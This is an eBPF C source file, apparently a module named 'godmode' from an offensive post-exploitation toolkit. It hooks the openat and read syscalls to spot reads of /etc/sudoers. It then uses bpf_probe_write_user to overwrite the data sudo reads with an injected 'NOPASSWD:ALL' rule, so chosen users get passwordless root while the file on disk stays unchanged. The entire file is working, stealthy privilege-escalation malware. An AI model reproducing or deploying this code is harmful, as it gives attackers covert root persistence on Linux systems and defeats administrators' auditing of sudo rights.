#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

/* .metadata — parsed by console to display module info */
char _metadata[] __attribute__((used, section(".metadata"))) =
    "{"
      "\"name\":\"godmode\","
      "\"desc\":\"Kernel Privilege Hijacking: Dynamically tampers with the sudoers read stream to grant passwordless sudo privileges to the target user.\","
      "\"requires\":[\"is_root\",\"tracefs\",\"probe_write\"],"
      "\"options\":{"
        "\"target\":[\"\\nroot ALL=(ALL:ALL) NOPASSWD:ALL\\n\",\"The rule to inject into sudoers (can contain multiple lines/users)\"]"
      "},"
      "\"maps\":{"
        "\"target\":{\"key_size\":4,\"value_size\":64,\"key_type\":\"u32\",\"value_type\":\"str\"}"
      "}"
    "}";

/*
 * Runtime-configurable payload
 * key=0 → 64-byte sudoers rule string (can contain multiple users/lines)
 * Example: "\ntest ALL=(ALL:ALL) NOPASSWD:ALL\ntest2 ALL=(ALL:ALL) NOPASSWD:ALL\n"
 * Written by the agent at load time, or updated at runtime via CMD_UPDATE
 */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, char[64]);
} target SEC(".maps");

/* Track processes that opened /etc/sudoers: pid_tgid → fd */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);
    __type(value, u32);
} active_sudoers_fd SEC(".maps");

/* Track user buffers currently read()ing the sudoers fd */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);
    __type(value, void *);
} active_read_buf SEC(".maps");

SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx) {
    const char *filename = (const char *)ctx->args[1];
    char fname[16];
    bpf_probe_read_user_str(&fname, sizeof(fname), filename);
    /* Match "/etc/sudoers" (character-level check to avoid string function overhead) */
    if (fname[0]=='/' && fname[1]=='e' && fname[2]=='t' && fname[3]=='c' &&
        fname[4]=='/' && fname[5]=='s' && fname[6]=='u' && fname[7]=='d' &&
        fname[8]=='o' && fname[9]=='e' && fname[10]=='r' && fname[11]=='s') {
        u64 id = bpf_get_current_pid_tgid();
        u32 mark = 1;
        bpf_map_update_elem(&active_sudoers_fd, &id, &mark, BPF_ANY);
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    u32 *mark = bpf_map_lookup_elem(&active_sudoers_fd, &id);
    if (mark) {
        if (ctx->ret >= 0) {
            u32 fd = (u32)ctx->ret;
            bpf_map_update_elem(&active_sudoers_fd, &id, &fd, BPF_ANY);
        } else {
            bpf_map_delete_elem(&active_sudoers_fd, &id);
        }
    }
    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    u32 *sudo_fd = bpf_map_lookup_elem(&active_sudoers_fd, &id);
    if (sudo_fd && (u32)ctx->args[0] == *sudo_fd) {
        void *buf = (void *)ctx->args[1];
        bpf_map_update_elem(&active_read_buf, &id, &buf, BPF_ANY);
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    void **buf_ptr = bpf_map_lookup_elem(&active_read_buf, &id);
    if (!buf_ptr) return 0;
    bpf_map_delete_elem(&active_read_buf, &id);

    if (ctx->ret > 64) {
        u32 key = 0;
        char *payload = bpf_map_lookup_elem(&target, &key);
        if (payload)
            bpf_probe_write_user(*buf_ptr, payload, 64);
    }
    return 0;
}